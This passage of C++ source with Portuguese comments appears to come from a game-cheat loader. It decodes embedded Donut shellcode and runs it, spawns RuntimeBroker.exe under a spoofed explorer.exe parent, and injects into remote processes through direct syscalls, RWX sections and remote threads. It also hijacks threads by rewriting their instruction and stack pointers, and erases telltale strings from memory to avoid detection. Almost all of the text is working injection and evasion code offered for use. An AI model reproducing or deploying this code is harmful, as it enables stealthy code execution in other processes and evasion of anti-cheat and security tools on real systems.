    }

    // Scrub na nossa heap: APENAS fragmentos de download (github/swgbck/
    // loadergrabber/Berok). NAO inclui "Spotify*" porque loader roda DENTRO
    // do Spotify — zerar "Spotify" aqui crasha o processo host.
    // "lsass.exe"/"dnscache" tambem nao, sao nomes normais do SO.
    inline std::size_t ScrubHttpStringsInSelf()
    {
        DynamicNeedles nd;
        AddDownloadLeakFragments(nd, true);

        // Pass 1: paginas writable (heap/stack) via NtWriteVirtualMemory padrao
        HANDLE hSelf = reinterpret_cast<HANDLE>(static_cast<LONG_PTR>(-1));
        std::size_t found = 0;
        std::size_t cleaned = ZeroNeedlesIn(hSelf, nd.needles, nd.count,
                                            nd.lo(), nd.hi(), &found);
        // Pass 2: .rdata/.text read-only (literais e format strings) via
        // VirtualProtect in-process — captura "github", "FiveM runtime pid=%lu",
        // "raw.githubusercontent.com" etc. que o pass 1 nao alcanca.
        cleaned += ScanSelfAllRegions(nd.needles, nd.count, nd.lo(), nd.hi());

        std::size_t left = 0;
        ZeroNeedlesIn(hSelf, nd.needles, nd.count, nd.lo(), nd.hi(),
                      &left, true);

        nd.wipe();
        return cleaned;
    }

    // -------------------------------------------------------------------------
    // EmbeddedCheat — shellcode Donut do cheat, embarcado como string base64
    // em .rdata (ver cheat_embedded.hpp).
    //
    // A string e referenciada por simbolo, entao funciona mesmo quando o PE e
    // mapeado manualmente pelo Donut e nao entra na lista de modulos do PEB
    // (foi exatamente isso que quebrou a versao com FindResourceW/RCDATA).
    // O compilador ve milhares de literais curtos, nao um array de 2,8M tokens.
    // -------------------------------------------------------------------------
    inline int Base64Value(char c)
    {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '+') return 62;
        if (c == '/') return 63;
        return -1;
    }

    inline std::size_t EmbeddedCheatDecodedSize()
    {
        std::size_t pads = 0;
        for (std::size_t i = 0; i < kCheatDonutBase64Len; ++i)
            if (kCheatDonutBase64[i] == '=') ++pads;
        return (static_cast<std::size_t>(kCheatDonutBase64Len) / 4) * 3 - pads;
    }

    inline bool DecodeEmbeddedCheat(uint8_t* dst, std::size_t cap,
                                    std::size_t& outLen)
    {
        outLen = 0;
        std::uint32_t acc = 0;
        int bits = 0;
        for (std::size_t i = 0; i < kCheatDonutBase64Len; ++i)
        {
            const char c = kCheatDonutBase64[i];
            if (c == '=') break;
            const int v = Base64Value(c);
            if (v < 0) return false;
            acc = (acc << 6) | static_cast<std::uint32_t>(v);
            bits += 6;
            if (bits >= 8)
            {
                bits -= 8;
                if (outLen >= cap) return false;
                dst[outLen++] = static_cast<uint8_t>((acc >> bits) & 0xFF);
            }
        }
        return true;
    }

    inline bool RunEmbeddedCheat()
    {
        const std::size_t expected = EmbeddedCheatDecodedSize();
        if (expected < 32) return false;

        // RW para gravar, promocao para RX depois. Nunca RWX.
        const HANDLE hSelf = reinterpret_cast<HANDLE>(static_cast<LONG_PTR>(-1));
        void* mem = api::VirtualAllocEx_(hSelf, nullptr, expected,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!mem)
        {
            return false;
        }

        std::size_t outLen = 0;
        if (!DecodeEmbeddedCheat(static_cast<uint8_t*>(mem), expected, outLen) ||
            outLen < 32 || outLen != expected)
        {
            api::VirtualFreeEx_(hSelf, mem, 0, MEM_RELEASE);
            return false;
        }

        DWORD oldProt = 0;
        if (!api::VirtualProtectEx_(hSelf, mem, outLen, PAGE_EXECUTE_READ, &oldProt))
        {
            api::VirtualFreeEx_(hSelf, mem, 0, MEM_RELEASE);
            return false;
        }

        // -e 3 (Exit Thread): o shellcode encerra a thread ao terminar.
        // Thread dedicada para nao derrubar o loop principal do loader.
        const HANDLE th = api::CreateThread_(nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(mem), nullptr, 0, nullptr);
        if (!th)
        {
            api::VirtualFreeEx_(hSelf, mem, 0, MEM_RELEASE);
            return false;
        }

        api::CloseH(th);
        return true;
    }

    // -------------------------------------------------------------------------
    // RunEmbeddedCheatInNewHost — cria um RuntimeBroker.exe suspenso cujo parent
    // e o explorer.exe (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS), injeta o shellcode
    // Donut do cheat e redireciona a thread principal para ele.
    //
    // Legado: versao antiga do host RuntimeBroker. Mantida apenas como
    // referencia; o caminho ativo e RunEmbeddedCheatInRuntimeBrokerHost().
    // -------------------------------------------------------------------------
    inline DWORD FindExplorerPid()
    {
        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return 0;
        PROCESSENTRY32W e{};
        e.dwSize = sizeof(e);
        DWORD pid = 0;
        if (sc::CallProcess32FirstW(snap, &e))
        {
            do
            {
                if (_wcsicmp(e.szExeFile, L"explorer.exe") == 0)
                {
                    pid = e.th32ProcessID;
                    break;
                }
            } while (sc::CallProcess32NextW(snap, &e));
        }
        sc::CallCloseHandle(snap);
        return pid;
    }

    // Host RuntimeBroker: sempre um processo novo e dedicado, com
    // parent=explorer.exe e job kill-on-close. O RuntimeBroker que o F# ja
    // sequestrou (onde este loader roda) nunca e usado como host do overlay.
    inline std::wstring FindRuntimeBrokerHostPath()
    {
        wchar_t dir[ MAX_PATH ] = {};
        api::GetSystemDirectoryW_( dir, MAX_PATH );
        return std::wstring( dir ) + L"\\RuntimeBroker.exe";
    }

    inline HANDLE EnsureHostKillJob()
    {
        HANDLE existing = g_hostKillJob.load(std::memory_order_acquire);
        if (existing && existing != INVALID_HANDLE_VALUE) return existing;

        HANDLE j = api::CreateJobObjectW_(nullptr, nullptr);
        if (!j) return nullptr;

        // Sem BREAKAWAY_OK: nenhuma thread filha pode sobreviver ao F7.
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION info{};
        info.BasicLimitInformation.LimitFlags =
            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        if (!api::SetInformationJobObject_(j,
                JobObjectExtendedLimitInformation, &info, sizeof(info)))
        {
            api::CloseH(j);
            return nullptr;
        }

        HANDLE expected = nullptr;
        if (!g_hostKillJob.compare_exchange_strong(expected, j))
        {
            api::CloseH(j);
            return expected;
        }
        return j;
    }

    // Estruturas minimas para SystemProcessInformation (class 5), usadas para
    // escolher uma thread com WaitReason que acorda sozinha (UserRequest /
    // DelayExecution). EventPairLow (wait de RPC) pode nunca acordar.
    struct SpiUnicodeString { USHORT Length; USHORT MaximumLength; PWSTR Buffer; };
    struct SpiClientId     { HANDLE UniqueProcess; HANDLE UniqueThread; };
    using SpiKPriority = LONG;

    struct SpiThread
    {
        LARGE_INTEGER KernelTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER CreateTime;
        ULONG         WaitTime;
        PVOID         StartAddress;
        SpiClientId   ClientId;
        LONG          Priority;
        LONG          BasePriority;
        ULONG         ContextSwitchCount;
        ULONG         State;
        ULONG         WaitReason;
    };

    struct SpiProcess
    {
        ULONG          NextEntryOffset;
        ULONG          NumberOfThreads;
        LARGE_INTEGER  SpareLi1;
        LARGE_INTEGER  SpareLi2;
        LARGE_INTEGER  SpareLi3;
        LARGE_INTEGER  CreateTime;
        LARGE_INTEGER  UserTime;
        LARGE_INTEGER  KernelTime;
        SpiUnicodeString ImageName;
        SpiKPriority   BasePriority;
        HANDLE         UniqueProcessId;
        HANDLE         InheritedFromUniqueProcessId;
        ULONG          HandleCount;
        ULONG          SessionId;
        ULONG_PTR      PageDirectoryBase;
        SIZE_T         PeakVirtualSize;
        SIZE_T         VirtualSize;
        ULONG          PageFaultCount;
        SIZE_T         PeakWorkingSetSize;
        SIZE_T         WorkingSetSize;
        SIZE_T         QuotaPeakPagedPoolUsage;
        SIZE_T         QuotaPagedPoolUsage;
        SIZE_T         QuotaPeakNonPagedPoolUsage;
        SIZE_T         QuotaNonPagedPoolUsage;
        SIZE_T         PagefileUsage;
        SIZE_T         PeakPagefileUsage;
        SIZE_T         PrivatePageCount;
        LARGE_INTEGER  ReadOperationCount;
        LARGE_INTEGER  WriteOperationCount;
        LARGE_INTEGER  OtherOperationCount;
        LARGE_INTEGER  ReadTransferCount;
        LARGE_INTEGER  WriteTransferCount;
        LARGE_INTEGER  OtherTransferCount;
        SpiThread      Threads[1];
    };

    inline DWORD PickHijackThread(DWORD targetPid, DWORD avoidTid)
    {
        using fnQsi = NTSTATUS(WINAPI*)(ULONG, PVOID, ULONG, PULONG);
        const HMODULE hNtdll = api::GetModuleHandleW_(xorstr(L"ntdll.dll"));
        auto pQsi = hNtdll
            ? reinterpret_cast<fnQsi>(api::GetProcAddr(hNtdll, "NtQuerySystemInformation"))
            : nullptr;

        ULONG len = 0;
        if (pQsi) pQsi(5, nullptr, 0, &len);
        if (len > sizeof(SpiProcess) && len < 64u * 1024u * 1024u)
        {
            std::vector<uint8_t> buf(len);
            const NTSTATUS st = pQsi(
                5, buf.data(), static_cast<ULONG>(buf.size()), &len);
            if (st >= 0)
            {
                auto* proc = reinterpret_cast<SpiProcess*>(buf.data());
                for (;;)
                {
                    if (static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(proc->UniqueProcessId)) == targetPid)
                    {
                        DWORD fallback = 0;
                        for (ULONG i = 0; i < proc->NumberOfThreads; ++i)
                        {
                            const SpiThread& t = proc->Threads[i];
                            const DWORD tid = static_cast<DWORD>(
                                reinterpret_cast<ULONG_PTR>(t.ClientId.UniqueThread));
                            if (!tid || tid == avoidTid) continue;
                            if (!fallback) fallback = tid;
                            const ULONG wr = t.WaitReason;
                            // UserRequest(6/13) e DelayExecution(4/11) acordam
                            // sozinhos; EventPairLow(14+) pode ficar preso.
                            if (wr == 6 || wr == 13 || wr == 4 || wr == 11)
                            {
                                return tid;
                            }
                        }
                        if (fallback)
                        {
                            return fallback;
                        }
                    }
                    if (!proc->NextEntryOffset) break;
                    proc = reinterpret_cast<SpiProcess*>(
                        reinterpret_cast<uint8_t*>(proc) + proc->NextEntryOffset);
                }
            }
        }

        // Fallback Toolhelp32
        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, targetPid);
        if (snap == INVALID_HANDLE_VALUE) return 0;
        THREADENTRY32 te{};
        te.dwSize = sizeof(te);
        DWORD tid = 0;
        if (api::Thread32First_(snap, &te))
        {
            do
            {
                if (te.th32OwnerProcessID == targetPid && te.th32ThreadID != avoidTid)
                {
                    tid = te.th32ThreadID;
                    break;
                }
            } while (api::Thread32Next_(snap, &te));
        }
        sc::CallCloseHandle(snap);
        return tid;
    }

    // -------------------------------------------------------------------------
    // Helpers copiados do fluxo de thread hijacking do ShellcodeFluctuation:
    // enumerar threads por NtQuerySystemInformation, abrir a primeira thread
    // com NtOpenThread, alocar a secao RWX remota e escrever o shellcode.
    // Nao ha SuspendThread/SetThreadContext: o startAddress e o wrapper, como
    // no projeto de referencia.
    // -------------------------------------------------------------------------
    inline bool EnumerateThreadIdsViaSyscall(DWORD targetPid,
                                             std::vector<DWORD>& ids)
    {
        ids.clear();
        ULONG len = 0;
        NTSTATUS st = nt::NtQuerySystemInformation_(5, nullptr, 0, &len);
        (void)st;
        if (len > sizeof(SpiProcess) && len < 64u * 1024u * 1024u)
        {
            std::vector<uint8_t> buf(len);
            st = nt::NtQuerySystemInformation_(
                5, buf.data(), static_cast<ULONG>(buf.size()), &len);
            if (NT_SUCCESS(st))
            {
                auto* proc = reinterpret_cast<SpiProcess*>(buf.data());
                for (;;)
                {
                    if (static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(
                            proc->UniqueProcessId)) == targetPid)
                    {
                        for (ULONG i = 0; i < proc->NumberOfThreads; ++i)
                        {
                            const DWORD tid = static_cast<DWORD>(
                                reinterpret_cast<ULONG_PTR>(
                                    proc->Threads[i].ClientId.UniqueThread));
                            if (tid) ids.push_back(tid);
                        }
                        return !ids.empty();
                    }
                    if (!proc->NextEntryOffset) break;
                    proc = reinterpret_cast<SpiProcess*>(
                        reinterpret_cast<uint8_t*>(proc) + proc->NextEntryOffset);
                }
            }
        }

        // Fallback identico ao do reference project quando QSI falha.
        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;
        THREADENTRY32 te{};
        te.dwSize = sizeof(te);
        if (api::Thread32First_(snap, &te))
        {
            do
            {
                if (te.th32OwnerProcessID == targetPid) ids.push_back(te.th32ThreadID);
            } while (api::Thread32Next_(snap, &te));
        }
        sc::CallCloseHandle(snap);
        return !ids.empty();
    }

    inline HANDLE OpenThreadViaSyscall(DWORD tid)
    {
        CLIENT_ID_ cid{};
        cid.UniqueProcess = nullptr;
        cid.UniqueThread = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(tid));

        OBJECT_ATTRIBUTES_ oa{};
        oa.Length = sizeof(oa);
        oa.RootDirectory = nullptr;
        oa.ObjectName = nullptr;
        oa.Attributes = 0;
        oa.SecurityDescriptor = nullptr;
        oa.SecurityQualityOfService = nullptr;

        HANDLE hThread = nullptr;
        if (NT_SUCCESS(nt::NtOpenThread_(
                &hThread, THREAD_ALL_ACCESS_, &oa, &cid)) && hThread)
            return hThread;
        return nullptr;
    }

    inline void JitterDelay(DWORD minMs, DWORD maxMs)
    {
        ULONG seed = static_cast<ULONG>(__rdtsc() & 0xFFFFFFFFULL);
        ULONG range = maxMs - minMs;
        if (!range) range = 1;
        ULONG ms = minMs + (seed % range);
        LARGE_INTEGER t;
        t.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        nt::NtDelayExecution_(FALSE, &t);
    }

    inline PVOID SectionAllocRemote(HANDLE hProcess, SIZE_T size,
                                    ULONG protect, HANDLE* outSection)
    {
        if (outSection) *outSection = nullptr;

        HANDLE hSec = nullptr;
        LARGE_INTEGER maxSz;
        maxSz.QuadPart = static_cast<LONGLONG>(size);
        NTSTATUS st = nt::NtCreateSection_(
            &hSec, SECTION_ALL_ACCESS, nullptr, &maxSz,
            PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
        if (!NT_SUCCESS(st) || !hSec) return nullptr;

        PVOID base = nullptr;
        SIZE_T viewSz = 0;
        st = nt::NtMapViewOfSection_(
            hSec, hProcess, &base, 0, size, nullptr, &viewSz,
            2, 0, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(st))
        {
            nt::NtClose_(hSec);
            return nullptr;
        }

        if (outSection) *outSection = hSec;
        (void)protect;
        return base;
    }

    // Copia literal do padrao injectViaExistingThread/injectShellcode do
    // ShellcodeFluctuation: abre uma thread existente, aloca secao RWX remota,
    // grava shellcode + EB FE + NOPs e cria a thread de execucao via
    // NtCreateThreadEx. Nenhuma thread e suspendida e nenhum contexto e roubado.
    inline bool InjectShellcodeLikeShellcodeFluctuation(
        const std::vector<uint8_t>& wrapper, HANDLE hProcess, DWORD pid,
        void** remoteOut, HANDLE* cheatThreadOut)
    {
        *remoteOut = nullptr;
        *cheatThreadOut = nullptr;

        std::vector<DWORD> threadIds;
        if (!EnumerateThreadIdsViaSyscall(pid, threadIds) || threadIds.empty())
        {
            return false;
        }

        HANDLE hVictim = nullptr;
        for (DWORD tid : threadIds)
        {
            hVictim = OpenThreadViaSyscall(tid);
            if (hVictim)
            {
                break;
            }
        }
        if (!hVictim)
        {
            return false;
        }

        SIZE_T totalSz = wrapper.size();
        SIZE_T scSz = (totalSz + 0xFFF) & ~static_cast<SIZE_T>(0xFFF);
        if (scSz < 0x1000) scSz = 0x1000;

        HANDLE hScSec = nullptr;
        PVOID scBase = SectionAllocRemote(
            hProcess, scSz, PAGE_EXECUTE_READWRITE, &hScSec);
        if (!scBase)
        {
            NTSTATUS st = nt::NtAllocateVirtualMemory_(
                hProcess, &scBase, 0, &scSz,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!NT_SUCCESS(st) || !scBase)
            {
                nt::NtClose_(hVictim);
                return false;
            }
        }
        else
        {
        }

        JitterDelay(10, 30);

        SIZE_T written = 0;
        NTSTATUS st = nt::NtWriteVirtualMemory_(
            hProcess, scBase, const_cast<uint8_t*>(wrapper.data()),
            wrapper.size(), &written);
        if (!NT_SUCCESS(st) || written != wrapper.size())
        {
            nt::NtClose_(hVictim);
            if (hScSec) nt::NtClose_(hScSec);
            return false;
        }

        JitterDelay(10, 30);

        HANDLE hThread = nullptr;
        // THREAD_CREATE_FLAGS_CREATE_SUSPENCED (1): a thread so criada suspensa
        // para que o loader patch o .text/canario ANTES do CRT do cheat rodar.
        // O ShellcodeFluctuation usa flags=0; aqui a suspensao e necessaria
        // porque o Donut do cheat corrompe o heap do RuntimeBroker sem isso.
        NTSTATUS st2 = nt::NtCreateThreadEx_(
            &hThread, THREAD_ALL_ACCESS_, nullptr, hProcess,
            scBase, nullptr, 1, 0, 0, 0, nullptr);
        nt::NtClose_(hVictim);
        if (hScSec) nt::NtClose_(hScSec);

        if (!NT_SUCCESS(st2) || !hThread)
        {
            return false;
        }

        *remoteOut = scBase;
        *cheatThreadOut = hThread;
        return true;
    }

    // -------------------------------------------------------------------------
    // Thread hijacking REAL: suspende uma thread do host, copia o CONTEXT,
    // redireciona RIP/RSP para o shellcode Donut e deixa um trampoline RX que
    // chama NtContinue(CONTEXT original) quando o stub termina. Nenhum byte do
    // shellcode e patchado. Nunca usa a thread do loader (avoidTid) e, se nao
    // houver candidato, cria uma thread nova suspensa no host.
    // -------------------------------------------------------------------------
    inline bool HijackThreadWithDonut(HANDLE hProcess, DWORD pid,
                                      DWORD avoidTid,
                                      const std::vector<uint8_t>& shellcode,
                                      void** remoteOut,
                                      DWORD* victimTidOut,
                                      bool* createdNewThreadOut,
                                      bool preferNewThread)
    {
        *remoteOut = nullptr;
        *victimTidOut = 0;
        if (createdNewThreadOut) *createdNewThreadOut = false;

        DWORD victimTid = 0;
        HANDLE hVictim = nullptr;
        bool createdNewThread = false;
        bool suspended = false;

        // O Donut termina a thread com ExitThread (-x 1). Se a vitima for uma
        // thread de trabalho do host, o processo inteiro morre. Por isso criamos
        // sempre uma thread nova suspensa e hijackamos o CONTEXT dela; a thread
        // antiga do loader nunca entra na lista de candidatos.
        if (preferNewThread)
        {
            HMODULE ntdll = api::GetModuleHandleW_(xorstr(L"ntdll.dll"));
            FARPROC start = ntdll
                ? api::GetProcAddr(ntdll, xorstr("NtContinue"))
                : nullptr;
            HANDLE hNew = nullptr;
            const NTSTATUS st = nt::NtCreateThreadEx_(
                &hNew, THREAD_ALL_ACCESS_, nullptr, hProcess,
                reinterpret_cast<LPTHREAD_START_ROUTINE>(start),
                nullptr, 1, 0, 0, 0, nullptr);
            if (NT_SUCCESS(st) && hNew)
            {
                hVictim = hNew;
                victimTid = ::GetThreadId(hNew);
                createdNewThread = true;
            }
            else
            {
            }
        }

        if (!hVictim)
        {
            victimTid = PickHijackThread(pid, avoidTid);
            hVictim = victimTid ? OpenThreadViaSyscall(victimTid) : nullptr;
        }

        if (!hVictim)
        {
            return false;
        }


        if (api::SuspendThread_(hVictim) == static_cast<DWORD>(-1))
        {
            api::CloseH(hVictim);
            return false;
        }
        suspended = true;

        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_ALL;
        if (!api::GetThreadContext_(hVictim, &ctx))
        {
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        const uintptr_t originalRip = static_cast<uintptr_t>(ctx.Rip);
        const uintptr_t originalRsp = static_cast<uintptr_t>(ctx.Rsp);

        HMODULE hNtdll = api::GetModuleHandleW_(xorstr(L"ntdll.dll"));
        FARPROC pNtContinue = hNtdll
            ? api::GetProcAddr(hNtdll, xorstr("NtContinue"))
            : nullptr;
        if (!pNtContinue)
        {
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        SIZE_T codeSize = (shellcode.size() + 0xFFF) & ~static_cast<SIZE_T>(0xFFF);
        if (codeSize < 0x1000) codeSize = 0x1000;
        constexpr SIZE_T ctxSize = sizeof(CONTEXT);
        constexpr SIZE_T trampSize = 0x40;

        PVOID remoteCode = api::VirtualAllocEx_(
            hProcess, nullptr, codeSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        PVOID remoteCtx = api::VirtualAllocEx_(
            hProcess, nullptr, ctxSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        PVOID remoteTramp = api::VirtualAllocEx_(
            hProcess, nullptr, trampSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteCode || !remoteCtx || !remoteTramp)
        {
            if (remoteCode) api::VirtualFreeEx_(hProcess, remoteCode, 0, MEM_RELEASE);
            if (remoteCtx) api::VirtualFreeEx_(hProcess, remoteCtx, 0, MEM_RELEASE);
            if (remoteTramp) api::VirtualFreeEx_(hProcess, remoteTramp, 0, MEM_RELEASE);
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        auto writeRemote = [&](PVOID dst, const void* src, SIZE_T len) -> bool
        {
            SIZE_T written = 0;
            const NTSTATUS st = nt::NtWriteVirtualMemory_(
                hProcess, dst, const_cast<void*>(src), len, &written);
            return NT_SUCCESS(st) && written == len;
        };

        // CONTEXT original ANTES de alterar o local.
        if (!writeRemote(remoteCtx, &ctx, ctxSize))
        {
            api::VirtualFreeEx_(hProcess, remoteCode, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteCtx, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteTramp, 0, MEM_RELEASE);
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        // mov rcx,ctx ; xor rdx,rdx ; mov rax,NtContinue ; call rax ; int3
        std::vector<uint8_t> tramp;
        auto emit64 = [&](uint64_t v)
        {
            for (int i = 0; i < 8; ++i)
                tramp.push_back(static_cast<uint8_t>(v >> (i * 8)));
        };
        tramp.push_back(0x48); tramp.push_back(0xB9);
        emit64(reinterpret_cast<uint64_t>(remoteCtx));
        tramp.push_back(0x48); tramp.push_back(0x31); tramp.push_back(0xD2);
        tramp.push_back(0x48); tramp.push_back(0xB8);
        emit64(reinterpret_cast<uint64_t>(pNtContinue));
        tramp.push_back(0xFF); tramp.push_back(0xD0);
        tramp.push_back(0xCC);
        if (!writeRemote(remoteTramp, tramp.data(), tramp.size()))
        {
            api::VirtualFreeEx_(hProcess, remoteCode, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteCtx, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteTramp, 0, MEM_RELEASE);
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        if (!writeRemote(remoteCode, shellcode.data(), shellcode.size()))
        {
            api::VirtualFreeEx_(hProcess, remoteCode, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteCtx, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteTramp, 0, MEM_RELEASE);
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        DWORD oldProtect = 0;
        if (!api::VirtualProtectEx_(hProcess, remoteCode, codeSize,
                                    PAGE_EXECUTE_READ, &oldProtect) ||
            !api::VirtualProtectEx_(hProcess, remoteTramp, trampSize,
                                    PAGE_EXECUTE_READ, &oldProtect))
        {
            api::VirtualFreeEx_(hProcess, remoteCode, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteCtx, 0, MEM_RELEASE);
            api::VirtualFreeEx_(hProcess, remoteTramp, 0, MEM_RELEASE);
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        // [originalRsp-8] = trampoline; o ret final do Donut entra aqui.
        const uint64_t frame = reinterpret_cast<uint64_t>(remoteTramp);
        const uintptr_t callRsp = originalRsp - 8;
        if (!writeRemote(reinterpret_cast<PVOID>(callRsp), &frame, sizeof(frame)))
        {
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        ctx.Rip = reinterpret_cast<uint64_t>(remoteCode);
        ctx.Rsp = static_cast<uint64_t>(callRsp);
        if (!api::SetThreadContext_(hVictim, &ctx))
        {
            nt::NtResumeThread_(hVictim, nullptr);
            api::CloseH(hVictim);
            return false;
        }

        CONTEXT verify{};
        verify.ContextFlags = CONTEXT_ALL;
        if (api::GetThreadContext_(hVictim, &verify))
        {
        }

        // A thread criada por NtCreateThreadEx ja nasce com suspend count=1;
        // o SuspendThread acima incrementou para 2. Primeiro resume desfaz o
        // SuspendThread deste hijack, o segundo libera a criacao suspensa.
        nt::NtResumeThread_(hVictim, nullptr);
        if (createdNewThread)
            nt::NtResumeThread_(hVictim, nullptr);
        suspended = false;
        api::CloseH(hVictim);

        *remoteOut = remoteCode;
        *victimTidOut = victimTid;
        if (createdNewThreadOut) *createdNewThreadOut = createdNewThread;
        return true;
    }

    // Procura a base da imagem Donut sem varrer byte a byte o espaco de
    // enderecos: apenas posicoes alinhadas a pagina, procurando a assinatura
    // conhecida no RVA 0x41C800. A varredura geral travava o worker do F7.
    inline BYTE* FindCheatImageBase(HANDLE process, const BYTE* signature,
                                    SIZE_T signatureSize)
    {
        SYSTEM_INFO si{};
        GetSystemInfo(&si);
        const uintptr_t minimum = reinterpret_cast<uintptr_t>(si.lpMinimumApplicationAddress);
        const uintptr_t maximum = reinterpret_cast<uintptr_t>(si.lpMaximumApplicationAddress);
        const uintptr_t pageSize = static_cast<uintptr_t>(si.dwPageSize);
        constexpr uintptr_t kSignatureRva = 0x41C800;

        uintptr_t address = minimum;
        while (address < maximum)
        {
            MEMORY_BASIC_INFORMATION mbi{};
            if (VirtualQueryEx(process, reinterpret_cast<LPCVOID>(address),
                               &mbi, sizeof(mbi)) != sizeof(mbi))
                break;

            const uintptr_t base = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
            const uintptr_t end = base + mbi.RegionSize;
            if (end <= address || end <= base)
                break;

            if (mbi.State == MEM_COMMIT && StringCleaner::IsReadableProtection(mbi.Protect))
            {
                const SIZE_T regionSize = static_cast<SIZE_T>(mbi.RegionSize);
                if (regionSize >= kSignatureRva + signatureSize &&
                    regionSize <= 0x2000000)
                {
                    std::vector<BYTE> buf(regionSize);
                    SIZE_T nr = 0;
                    if (::ReadProcessMemory(process, reinterpret_cast<LPCVOID>(base),
                                            buf.data(), regionSize, &nr) &&
                        nr == regionSize)
                    {
                        for (SIZE_T i = kSignatureRva;
                             i + signatureSize <= nr; ++i)
                        {
                            if (memcmp(buf.data() + i, signature, signatureSize) == 0)
                            {
                                uintptr_t imgBase = base + (i - kSignatureRva);
                                return reinterpret_cast<BYTE*>(imgBase);
                            }
                        }
                    }
                }
                else if (regionSize > 0x1000)
                {
                }

                uintptr_t pos = (std::max)(address, base);
                const uintptr_t rem = pageSize - (pos & (pageSize - 1));
                if (rem != pageSize)
                    pos += rem;

                while (pos < end && kSignatureRva < end - pos &&
                       kSignatureRva + signatureSize <= end - pos)
                {
                    BYTE probe[16]{};
                    SIZE_T nr2 = 0;
                    if (signatureSize <= sizeof(probe) &&
                        ::ReadProcessMemory(process,
                            reinterpret_cast<LPCVOID>(pos + kSignatureRva),
                            probe, signatureSize, &nr2) &&
                        nr2 == signatureSize &&
                        memcmp(probe, signature, signatureSize) == 0)
                    {
                        return reinterpret_cast<BYTE*>(pos);
                    }
                    if (end - pos < pageSize)
                        break;
                    pos += pageSize;
                }
            }
            address = end;
        }
        return nullptr;
    }

    // Forca a inicializacao do pool do overlay sem depender do canario TLS.
    // O padrao e unico no Update.exe: `cmp [flag],canario ; jg init` seguido
    // de `mov r13,[rip+...]`. Trocamos apenas o jg por um jmp incondicional
    // na memoria do host; o arquivo em disco nao e alterado.
    //
    // O Donut descompacta o PE e pode deixar mais de uma copia desses bytes:
    // uma num buffer RW (nao executavel) e outra na .text mapeada como RX.
    // So patchar a primeira (como antes) nao evitava o crash em 0x...379c,
    // que e exatamente o RVA 0x17379C do código que executa. Por isso todas
    // as ocorrencias sao coletadas e as regioes executaveis tem prioridade.
    inline bool ForceOverlayInitInHost(HANDLE process, HANDLE thread,
                                       DWORD targetPid, DWORD timeoutMs = 1000)
    {
        const BYTE pattern[9] = {
            0x0F, 0x8F, 0x41, 0x0D, 0x00, 0x00, 0x4C, 0x8B, 0x2D
        };
        const BYTE patch[6] = { 0xE9, 0x42, 0x0D, 0x00, 0x00, 0x90 };
        constexpr uintptr_t kSiteRva = 0x17378F;

        SYSTEM_INFO si{};
        GetSystemInfo(&si);
        const uintptr_t minimum = reinterpret_cast<uintptr_t>(si.lpMinimumApplicationAddress);
        const uintptr_t maximum = reinterpret_cast<uintptr_t>(si.lpMaximumApplicationAddress);
        // NtQueryInformationThread para localizar o TEB da thread do cheat.
        using fnQit = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        HMODULE hNt = api::GetModuleHandleW_(xorstr(L"ntdll.dll"));
        auto pQit = hNt
            ? reinterpret_cast<fnQit>(api::GetProcAddr(hNt, "NtQueryInformationThread"))
            : nullptr;

        struct Tbi { NTSTATUS Exit; PVOID Teb; ULONG_PTR A[4]; } tbi{};
        ULONG tbiLen = 0;
        const bool haveTeb = pQit &&
            NT_SUCCESS(pQit(thread, 0, &tbi, sizeof(tbi), &tbiLen)) &&
            tbi.Teb != nullptr;

        const DWORD started = GetTickCount();
        unsigned attempts = 0;
        bool anyFlagWrite = false;

        for (;;)
        {
            DWORD exitCode = 0;
            if (::GetExitCodeProcess(process, &exitCode) &&
                exitCode != STILL_ACTIVE)
            {
                return false;
            }

            bool done = false;
            uintptr_t address = minimum;
            while (address < maximum)
